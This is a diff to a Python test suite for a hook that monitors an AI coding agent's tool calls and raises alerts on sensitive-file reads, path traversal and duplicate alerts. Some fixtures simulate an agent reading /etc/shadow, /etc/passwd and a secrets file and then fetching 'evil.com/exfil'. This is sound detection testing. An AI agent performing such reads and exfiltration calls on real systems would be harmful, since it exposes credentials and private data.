@@ -294,20 +294,31 @@ class TestOpenAIAgentSDKIntegration:
 # ---------------------------------------------------------------------------
 
 class TestClaudeCodeHook:
-    """Tests for the Claude Code PostToolUse hook."""
+    """Tests for the Claude Code PostToolUse hook.
+
+    These tests simulate real multi-invocation sessions, not just
+    isolated function calls. Each test covers behavior that would
+    be visible in a 30-second real session.
+    """
+
+    def _with_traces_dir(self, tmpdir: str):
+        """Context manager to redirect TRACES_DIR to a temp directory."""
+        import aktov.hooks.claude_code as hook_mod
+        original = hook_mod.TRACES_DIR
+        hook_mod.TRACES_DIR = Path(tmpdir)
+        return original
 
     def test_append_and_load_actions(self) -> None:
         """Actions can be appended and loaded from trace file."""
         from aktov.hooks.claude_code import _append_action, _load_session_actions
 
         with tempfile.TemporaryDirectory() as tmpdir:
+            original = self._with_traces_dir(tmpdir)
             import aktov.hooks.claude_code as hook_mod
-            original_dir = hook_mod.TRACES_DIR
-            hook_mod.TRACES_DIR = Path(tmpdir)
 
             try:
-                action1 = {"tool_name": "Read", "arguments": {"path": "/tmp/test"}}
-                action2 = {"tool_name": "Edit", "arguments": {"path": "/tmp/test"}}
+                action1 = {"tool_name": "Read", "arguments": {"file_path": "/tmp/test"}}
+                action2 = {"tool_name": "Edit", "arguments": {"file_path": "/tmp/test"}}
 
                 trace_file = _append_action("test-session", action1)
                 _append_action("test-session", action2)
@@ -317,10 +328,37 @@ class TestClaudeCodeHook:
                 assert loaded[0]["tool_name"] == "Read"
                 assert loaded[1]["tool_name"] == "Edit"
             finally:
-                hook_mod.TRACES_DIR = original_dir
+                hook_mod.TRACES_DIR = original
 
-    def test_evaluate_and_alert(self, capsys: pytest.CaptureFixture) -> None:
-        """_evaluate_and_alert prints alerts to stderr."""
+    def test_session_id_passed_to_trace(self) -> None:
+        """session_id from _get_session_id() must reach start_trace()."""
+        from aktov.hooks.claude_code import _evaluate_and_alert
+
+        actions = [
+            {"tool_name": "Read", "arguments": {"file_path": "/etc/passwd"}},
+        ]
+
+        with patch("aktov.hooks.claude_code.Aktov") as mock_aktov_cls:
+            mock_client = mock_aktov_cls.return_value
+            mock_trace = MagicMock()
+            mock_client.start_trace.return_value = mock_trace
+            mock_trace.end.return_value = MagicMock(alerts=[])
+
+            _evaluate_and_alert(
+                "test-agent", actions,
+                session_id="20260208-12345",
+            )
+
+            mock_client.start_trace.assert_called_once_with(
+                agent_id="test-agent",
+                agent_type="claude-code",
+                session_id="20260208-12345",
+            )
+
+    def test_evaluate_fires_on_sensitive_path(
+        self, capsys: pytest.CaptureFixture,
+    ) -> None:
+        """_evaluate_and_alert detects sensitive directory access (AK-031)."""
         from aktov.hooks.claude_code import _evaluate_and_alert
 
         actions = [
@@ -331,15 +369,230 @@ class TestClaudeCodeHook:
 
         captured = capsys.readouterr()
         assert "AK-032" in captured.err
-        assert "PATH_TRAVERSAL" in captured.err or "path_traversal" in captured.err.lower()
+        assert "path_traversal" in captured.err.lower()
 
-    def test_session_id_stable_within_process(self) -> None:
-        """_get_session_id returns consistent value within same process."""
+    def test_no_duplicate_alerts_on_repeated_evaluation(
+        self, capsys: pytest.CaptureFixture,
+    ) -> None:
+        """Simulates 5 hook invocations. Same rules must not fire twice
+        for the same matched actions.
+
+        This is the core test for alert snowballing — the bug that caused
+        49 duplicate entries in alerts.jsonl from ~25 tool calls.
+        """
+        from aktov.hooks.claude_code import (
+            _append_action,
+            _evaluate_and_alert,
+            _load_session_actions,
+        )
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            import aktov.hooks.claude_code as hook_mod
+            original = hook_mod.TRACES_DIR
+            hook_mod.TRACES_DIR = Path(tmpdir)
+
+            try:
+                session_id = "dedup-test"
+
+                # Invocation 1: benign action
+                tf = _append_action(session_id, {
+                    "tool_name": "Read",
+                    "arguments": {"file_path": "/home/user/readme.md"},
+                })
+                actions = _load_session_actions(tf)
+                _evaluate_and_alert(
+                    "test-agent", actions,
+                    session_id=session_id, trace_file=tf,
+                )
+                out1 = capsys.readouterr()
+                assert "AK-031" not in out1.err
+
+                # Invocation 2: sensitive path — should fire AK-031
+                _append_action(session_id, {
+                    "tool_name": "Read",
+                    "arguments": {"file_path": "/etc/shadow"},
+                })
+                actions = _load_session_actions(tf)
+                _evaluate_and_alert(
+                    "test-agent", actions,
+                    session_id=session_id, trace_file=tf,
+                )
+                out2 = capsys.readouterr()
+                assert "AK-031" in out2.err, "AK-031 should fire on first sensitive access"
+
+                # Invocations 3, 4, 5: more benign actions — AK-031 must NOT re-fire
+                for i in range(3):
+                    _append_action(session_id, {
+                        "tool_name": "Glob",
+                        "arguments": {"pattern": "*.py"},
+                    })
+                    actions = _load_session_actions(tf)
+                    _evaluate_and_alert(
+                        "test-agent", actions,
+                        session_id=session_id, trace_file=tf,
+                    )
+                    out_n = capsys.readouterr()
+                    assert "AK-031" not in out_n.err, (
+                        f"AK-031 should NOT re-fire on invocation {i + 3}"
+                    )
+            finally:
+                hook_mod.TRACES_DIR = original
+
+    def test_accumulated_sequence_triggers_ak010(
+        self, capsys: pytest.CaptureFixture,
+    ) -> None:
+        """A 'read' then 'network' sequence across separate hook calls
+        should trigger AK-010 (read_then_external_network_egress).
+
+        Requires Bug 3 fix: 'Read' must map to 'read' category
+        and 'WebFetch' must map to 'network' category.
+        """
+        from aktov.hooks.claude_code import (
+            _append_action,
+            _evaluate_and_alert,
+            _load_session_actions,
+        )
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            import aktov.hooks.claude_code as hook_mod
+            original = hook_mod.TRACES_DIR
+            hook_mod.TRACES_DIR = Path(tmpdir)
+
+            try:
+                session_id = "sequence-test"
+
+                # Invocation 1: read a file
+                tf = _append_action(session_id, {
+                    "tool_name": "Read",
+                    "arguments": {"file_path": "/home/user/secrets.txt"},
+                })
+                actions = _load_session_actions(tf)
+                _evaluate_and_alert(
+                    "test-agent", actions,
+                    session_id=session_id, trace_file=tf,
+                )
+                capsys.readouterr()  # clear
+
+                # Invocation 2: network egress to external URL
+                _append_action(session_id, {
+                    "tool_name": "WebFetch",
+                    "arguments": {"url": "https://evil.com/exfil"},
+                })
+                actions = _load_session_actions(tf)
+                _evaluate_and_alert(
+                    "test-agent", actions,
+                    session_id=session_id, trace_file=tf,
+                )
+                out2 = capsys.readouterr()
+                assert "AK-010" in out2.err, (
+                    "AK-010 should fire when read is followed by external network"
+                )
+            finally:
+                hook_mod.TRACES_DIR = original
+
+    def test_claude_code_tool_names_map_correctly(self) -> None:
+        """Verify Claude Code tool names resolve to correct categories."""
+        from aktov.canonicalization import infer_tool_category
+
+        expected = {
+            "Read": "read",
+            "Glob": "read",
+            "Grep": "read",
+            "Write": "write",
+            "Edit": "write",
+            "NotebookEdit": "write",
+            "TodoWrite": "write",
+            "Bash": "execute",
+            "Skill": "execute",
+            "WebFetch": "network",
+            "WebSearch": "network",
+        }
+        for tool_name, expected_category in expected.items():
+            actual = infer_tool_category(tool_name)
+            assert actual == expected_category, (
+                f"'{tool_name}' should map to '{expected_category}', got '{actual}'"
+            )
+
+    def test_full_hook_lifecycle(
+        self, capsys: pytest.CaptureFixture,
+    ) -> None:
+        """End-to-end: 3 hook invocations simulating a real session.
+
+        (a) benign read → no alerts
+        (b) read /etc/passwd → AK-031 fires once
+        (c) another benign read → AK-031 does NOT fire again
+        """
+        from aktov.hooks.claude_code import (
+            _append_action,
+            _evaluate_and_alert,
+            _load_session_actions,
+        )
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            import aktov.hooks.claude_code as hook_mod
+            original = hook_mod.TRACES_DIR
+            hook_mod.TRACES_DIR = Path(tmpdir)
+
+            try:
+                session_id = "lifecycle-test"
+
+                # (a) Benign read
+                tf = _append_action(session_id, {
+                    "tool_name": "Read",
+                    "arguments": {"file_path": "/home/user/app.py"},
+                })
+                actions = _load_session_actions(tf)
+                _evaluate_and_alert(
+                    "test-agent", actions,
+                    session_id=session_id, trace_file=tf,
+                )
+                out_a = capsys.readouterr()
+                assert "AK-031" not in out_a.err
+                assert "AK-032" not in out_a.err
+
+                # (b) Sensitive path read
+                _append_action(session_id, {
+                    "tool_name": "Read",
+                    "arguments": {"file_path": "/etc/passwd"},
+                })
+                actions = _load_session_actions(tf)
+                _evaluate_and_alert(
+                    "test-agent", actions,
+                    session_id=session_id, trace_file=tf,
+                )
+                out_b = capsys.readouterr()
+                assert "AK-031" in out_b.err, "AK-031 should fire on /etc/passwd"
+
+                # (c) Another benign read — AK-031 must NOT fire again
+                _append_action(session_id, {
+                    "tool_name": "Grep",
+                    "arguments": {"pattern": "def main"},
+                })
+                actions = _load_session_actions(tf)
+                _evaluate_and_alert(
+                    "test-agent", actions,
+                    session_id=session_id, trace_file=tf,
+                )
+                out_c = capsys.readouterr()
+                assert "AK-031" not in out_c.err, (
+                    "AK-031 should not re-fire in same session"
+                )
+            finally:
+                hook_mod.TRACES_DIR = original
+
+    def test_session_id_format(self) -> None:
+        """_get_session_id returns consistent YYYYMMDD-<ppid> format."""
         from aktov.hooks.claude_code import _get_session_id
 
         id1 = _get_session_id()
         id2 = _get_session_id()
         assert id1 == id2
+
+        parts = id1.split("-")
+        assert len(parts) == 2
+        assert len(parts[0]) == 8  # YYYYMMDD
+        assert parts[0].isdigit()
+        assert parts[1].isdigit()  # ppid
 
 
 # ---------------------------------------------------------------------------
